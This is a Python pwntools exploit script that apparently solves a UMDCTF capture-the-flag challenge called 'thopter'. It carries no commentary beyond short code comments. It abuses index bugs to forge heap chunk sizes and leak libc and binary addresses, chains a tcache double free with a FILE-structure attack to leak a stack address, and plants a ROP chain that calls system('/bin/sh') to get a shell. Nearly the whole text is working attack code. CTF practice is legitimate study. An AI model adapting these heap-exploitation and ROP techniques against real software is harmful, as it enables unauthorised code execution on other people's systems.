from pwn import *
from icecream import ic
import tty

# Set up pwntools for the correct architecture
exe = "./thopter"
libc = ELF("./libc.so.6")
context.binary = elf = ELF(exe)
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("challs.umdctf.io", 31727 )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

# Useful macros
def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()
eof = chr(tty.CEOF)

def pilot(ind, le, name):
    sla(b"> ", b"1")
    sla(b"idx: ", str(ind).encode())
    sla(b"pilot name len: ", str(le).encode())
    sla(b"pilot name: ", name)

def id(ind, id):
    sla(b"> ", b"2")
    sla(b"idx: ", str(ind).encode())
    sla(b"id: ", str(id).encode())

def fly(ind):
    sla(b"> ", b"3")
    sla(b"idx: ", str(ind).encode())
    ru(b"ornithopter ")
    return int(rl().split()[0])

r = start()

pilot(763, 0x28, b"JUNKJUNK")
id(763, 0x521)
id(763 + 0x520//16, 0x21)
id(763 + 0x520//16 + 0x20//16, 0x21)
pilot(788, 0x6f8, b"JUNKJUNK")

libc.address = ic(fly(0x2fc)) - 0x203f50

id(0x207, 0x521)
id(0x207 + 0x520//16, 0x21)
id(0x207 + 0x520//16 + 0x20//16, 0x21)
pilot(0x315, 0x6f8, b"JUNKJUNK")

elf.address = (fly(0x208) - 0x6ff0)
ic(hex(elf.address))

# tcache double free
chk = elf.address
id(0x204, 0x151)
pilot(0x313, 0x148, p64(chk+0x6090) + p64(0) + p64(chk+0x6090) + b"BBBBBBBB" + p64(chk+0x6090) + p64(0) + p64(chk+0x6090) + p64(0) + p64(chk+0x6090) + p64(0) + p64(chk+0x6090))

pilot(0x205, 0x900, b"BOBBOB")
id(0x205, 0)
pilot(0x206, 0x900, p64(0)*2)
id(0x205, 0)
pilot(0x207, 0x900, p64(0)*2)

# FSOP - stack leak
fp = chk + 0x7000

pilot(0x70, 0x148, p64(int((chk+0x6090)>>12) ^ (libc.address + 0x2045c0)))
pilot(0x71, 0x148, p64(fp))
ic(hex(fp))
pilot(0x72, 0x148, p64(0xfbad2887) + p64(0) + p64(libc.sym.environ) + p64(0) + p64(libc.sym.environ) + p64(libc.sym.environ + 16) + p64(0)*5)

stack = ic(u64(re(6) + b"\0\0"))

# double free again
id(0x205, 0)
pilot(0x208, 0x900, p64(0)*2)
id(0x205, 0)
pilot(0x209, 0x900, p64(0)*2)
id(0x205, 0)
pilot(0x20a, 0x900, p64(0)*2)

# ROP 
pilot(0x46, 0x148, p64(int((chk+0x6090)>>12) ^ (stack - 0x138)))
pilot(0x44, 0x148, p64(0xdeadbeef))

rop = (p64(1)
    + p64(libc.address + 0x000000000002882f)
    + p64(0x000000000010f75b + libc.address) 
    + p64(next(libc.search(b"/bin/sh\0")))
    + p64(libc.sym.system ))

pilot(0x40, 0x148, rop)


r.interactive()
